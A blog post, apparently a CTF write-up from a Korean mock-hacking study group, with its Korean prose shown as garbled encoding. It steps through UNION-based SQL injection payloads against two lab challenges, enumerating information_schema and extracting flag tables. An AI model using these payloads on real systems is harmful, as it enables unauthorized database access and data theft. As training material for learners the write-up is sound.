---
layout: post
comments: true
sitemap:
    changefreq: daily
    priority: 0.5

title: "[SECURITY] CTF ë¬¸ì œ í’€ì´: SQL Injection w. UNION"
excerpt: "ëª¨ì˜í•´í‚¹ ì·¨ì—…ë°˜ ìŠ¤í„°ë”” 7ê¸° 6ì£¼ì°¨"

date: 2024-11-25
last_modified_at: 2024-11-25

tags: [TIL, WEB, DATABASE, SECURITY]
---

# SQL INJECTION 1
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-1.png?raw=true)
ì²˜ìŒ ë“¤ì–´ê°€ë©´ ë³¼ ìˆ˜ ìžˆëŠ” í™”ë©´ì´ë‹¤. SQL Injection ë¬¸ì œë¼ê³  ì œëª©ë¶€í„° ë°•í˜€ìžˆìœ¼ë‹ˆ ì–Œì „ížˆ queryë¬¸ì„ ìž‘ì„±í•˜ê² ë‹¤.

## SQL Query íŒŒì•…
1. **adminer**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-2.png?raw=true)
    -> ðŸ¤” ëŒ€ì†Œë¬¸ìž êµ¬ë¶„ì´ ì—†êµ¬ë‚˜!
2. ðŸ«£ **~~adminer'~~**
    -> X
3. **a%**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-3.png?raw=true)
    -> ðŸ¤” like êµ¬ì ˆì´ ìžˆêµ¬ë‚˜
4. ðŸ«£ **~~a#~~**
    -> X
5. ðŸ«£ **~~a'#~~**
    -> X
6. **a%'#**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-4.png?raw=true)
    -> ðŸ«£ ~~ìž…ë ¥ê°’ì´ ë“¤ì–´ê°€ëŠ” ê³³ì´ like ìœ„ì¹˜ì¸ê°€ ë³´ë‹¤~~
    -> ðŸ¤” queryì— ê´„í˜¸ ì•ˆ ì‚¬ìš©í•˜ê³  ì£¼ì„ í•„í„°ë§ ì—†ë‚˜ ë³´ë‹¤
7. ðŸ«£ **~~' and '1' = '1~~**
    -> X
8. ðŸ«£ **~~%' and '1' = '1~~**
    -> X
9. **' and '1' = '1'#**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-5.png?raw=true)

## column ê°œìˆ˜ íŒŒì•…í•˜ê¸°
10. **' order by 1, 2, 3, 4 #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-6.png?raw=true)
    -> ë³´ì´ëŠ” columnì´ 4ê°œë‹ˆê¹Œ 4ê°œë¶€í„° ì‹œìž‘í–ˆë‹¤.
11. **' order by 1, 2, 3, 4, 5 #**
    -> X
    -> ðŸ¤” columnì˜ ê°œìˆ˜ê°€ 4ê°œêµ¬ë§Œ

## UNION ì‚¬ìš© ê°€ëŠ¥í•œì§€ í™•ì¸í•˜ê¸°
12. **' union select 1, 2, 3, 4 #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-7.png?raw=true)

## DATABASE ì´ë¦„ í™•ì¸í•˜ê¸°
13. **' union select database(), 2, 3, 4 #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-8.png?raw=true)
    -> database ì´ë¦„ì€ sqli_1ì´ì—ˆë‹¤.

## TABLE ì´ë¦„ í™•ì¸í•˜ê¸°
19. **' union select table_name, 2, 3, 4 from information_schema.tables where table_schema = 'sqli_1' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-9.png?raw=true)
    -> tableì´ ì´ 3ê°œê°€ ë‚˜ì™”ëŠ”ë°, ë”± ë´ë„ ìˆ˜ìƒí•´ ë³´ì´ëŠ” flag_tableì™€ plusFlag_Tableë¥¼ ë¨¼ì € ì‹œë„í•˜ê¸°ë¡œ í–ˆë‹¤.

## COLUMN ì´ë¦„ í™•ì¸í•˜ê¸°
20. **' union select 1, column_name, 3, 4 from information_schema.columns where table_name = 'flag_table' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-10.png?raw=true)
    -> flag_tableì—ì„œëŠ” flagë¼ëŠ” columnì„ í™•ì¸í•  ìˆ˜ ìžˆì—ˆë‹¤.

21. **' union select 1, column_name, 3, 4 from information_schema.columns where table_name = 'plusFlag_Table' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-11.png?raw=true)
    -> plusFlag_Tableì—ì„œëŠ” idxê³¼ flagë¼ëŠ” columnë“¤ì„ í™•ì¸í•  ìˆ˜ ìžˆì—ˆë‹¤.

## DATA ì¶”ì¶œí•˜ê¸°
22. **' union select flag, 2, 3, 4 from flag_table #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-12.png?raw=true)

23. **' union select idx, flag, 3, 4 from plusFlag_Table #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-13.png?raw=true)

# SQL INJECTION 2
## SQL Query íŒŒì•…
1. normaltic
-> ë³´ì´ëŠ” columnì€ ID, Level, Rank Point, info
2. normaltic' and '1' = '1
-> O
-> IDê°€ ìž…ë ¥í•œ ê·¸ëŒ€ë¡œ ë³´ìž„
3. *
-> rowê°€ 1ê°œì¸ê°€ë´

## column ê°œìˆ˜ íŒŒì•…í•˜ê¸°
4. normaltic' order by 1, 2, 3, 4 #
-> O
5. normaltic' order by 1, 2, 3, 4, 5 #
-> O
6. normaltic' order by 1, 2, 3, 4, 5, 6 #
-> O
7. normaltic' order by 1, 2, 3, 4, 5, 6, 7 # 
-> X
-> column: 6

## ì¶œë ¥ë˜ëŠ” column ìœ„ì¹˜ ì°¾ê¸°, DATABASE ì´ë¦„ í™•ì¸í•˜ê¸°
8. ' union select database(), 2, 3, 4, 5, 6 #
-> X
-> 1 column ë¹„ê³µê°œë‹¤
9. ' union select 1, database(), 3, 4, 5, 6 #
-> 2 column ë¹„ê³µê°œë‹¤
10. ' union select 1, 2, 3, 4, 5, database() #
-> sqli_5
-> 6 column ê³µê°œ

## TABLE ì´ë¦„ í™•ì¸í•˜ê¸°
11. ' union select 1, 2, 3, 4, 5, table_name from information_schema.tables where table_schema = 'sqli_5' #
-> flag_honey

## COLUMN ì´ë¦„ í™•ì¸í•˜ê¸°
12. ' union select 1, 2, 3, 4, 5, column_name from information_schema.columns where table_name = 'flag_honey' #
-> flag

## DATA ì¶”ì¶œí•˜ê¸°
13. ' union select 1, 2, 3, 4, 5, flag from flag_honey #
-> kkkkkkk_Not Here!
-> ì–´ì©ì§€ êµ¬ë¼í•‘ì˜ ëƒ„ìƒˆê°€ ë‚˜ë”ë¼


ì™œ 1ê°œì”© ë°–ì— ì•ˆ ë³´ì¼ê¹Œ?
-> rowê°€ ë”± í•œ ê°œë‹¤?
14. ' or '1' = '1
-> row 1ê°œ
10. ' union select 1, 2, 3, 4, 5, database() #
-> sqli_5
-> ë‹¤ë¥¸ rowê°€ ë” ìžˆëŠ”ë° ì•ˆ ë³´ì´ëŠ” ê²Œ ì•„ë‹ê¹Œ?
11. ' union select 1, 2, 3, 4, 5, table_name from information_schema.tables where table_schema = 'sqli_5' #
-> ë‹¤ë¥¸ rowê°€ ë” ìžˆëŠ”ë° ì•ˆ ë³´ì´ëŠ” ê²Œ ì•„ë‹ê¹Œ?
-> rowê°€ í•œ ê°œ ë°–ì— ì•ˆ ë³´ì´ë‹ˆê¹Œ
-> ë‹¤ë¥¸ tableì´ ìžˆëŠ” ë° ì•ˆ ë³´ì´ëŠ” ê±°ì§€
12. ' union select 1, 2, 3, 4, 5, table_name from information_schema.tables order by 6 desc#
-> viewë¼ëŠ” ë‹¤ë¥¸ tableì´ ë³´ì—¬ìš” ì¢‹ì•„ìš”
13. ' union select 1, 2, 3, 4, 5, table_name from information_schema.tables where table_schema = 'sqli_5' order by 6 desc #
-> secret
12. ' union select 1, 2, 3, 4, 5, column_name from information_schema.columns where table_name = 'secret' #
-> flag
13. ' union select 1, 2, 3, 4, 5, flag from secret #
-> NONONO~
14. ' union select 1, 2, 3, 4, 5, column_name from information_schema.columns where table_name = 'secret' order by 6 #
-> flag
15. ' union select 1, 2, 3, 4, 5, flag from secret order by 6 desc #